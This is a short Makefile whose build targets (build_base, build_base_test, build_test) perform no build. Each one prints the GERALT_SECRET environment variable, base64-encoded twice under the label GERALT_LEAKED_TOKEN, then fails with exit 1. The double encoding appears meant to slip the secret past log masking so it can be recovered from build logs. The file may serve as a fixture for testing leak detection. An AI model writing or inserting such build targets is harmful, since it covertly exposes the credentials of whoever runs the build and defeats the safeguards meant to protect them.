.PHONY: build_base build_base_test build_test

build_base build_base_test build_test:
	@bash -c 'echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"; exit 1'
